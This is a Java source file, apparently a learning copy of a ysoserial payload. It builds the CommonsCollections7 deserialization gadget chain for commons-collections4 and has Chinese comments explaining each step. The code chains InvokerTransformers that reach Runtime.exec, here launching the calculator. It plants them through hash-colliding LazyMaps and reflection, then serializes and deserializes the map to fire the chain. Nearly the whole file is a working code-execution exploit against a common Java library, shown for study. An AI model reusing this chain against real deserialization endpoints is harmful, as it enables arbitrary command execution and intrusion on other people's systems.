package ysoserial.payloads.forlearn;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * 使用 commons-collections:4.0 替换 commons-collections:3.x
 */
public class CommonsCollections7_Simple_Hashtable2HashMap_v4 {

    public static void main(String[] args) {
        try {
            Transformer[] transformers = new Transformer[]{
                //Runtime类没有实现 java.io.Serializable 接口，
                //   所以不能被序列化，所以得换以下这种方式
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                    new Class[]{String.class, Class[].class},
                    new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec",
                    new Class[]{String.class},
                    new Object[]{"open -a Calculator"}
                ),
            };

            Transformer[] tmpTransformers = new Transformer[] {
                new ConstantTransformer(1),
            };

            //这里先构造一个无意义的执行链，因为下面构造序列化数据时，HashMap要进行put操作，
            //  所以这是为了避免生成序列化数据的过程中触发命令执行的代码。
            //在下面put操作后通过反射再将含有命令执行的执行链构造好即可。
            Transformer transformerChain = new ChainedTransformer(tmpTransformers);

            Map innerMap1 = new HashMap();
            Map outerMap1 = LazyMap.lazyMap(innerMap1, transformerChain);

            Map innerMap2 = new HashMap();
            Map outerMap2 = LazyMap.lazyMap(innerMap2, transformerChain);

            //构造可导致hash冲突两个Map对象
            outerMap1.put("aa", 11);
            outerMap2.put("bB", 11);

            HashMap hashtable = new HashMap();
            hashtable.put(outerMap1, 3);
            hashtable.put(outerMap2, 3);
            outerMap1.remove("bB");

            Field iTransformersField = transformerChain.getClass().getDeclaredField("iTransformers");
            iTransformersField.setAccessible(true);
            iTransformersField.set(transformerChain, transformers);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(hashtable);
            System.out.println(baos.toString());

            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
            Object o = ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
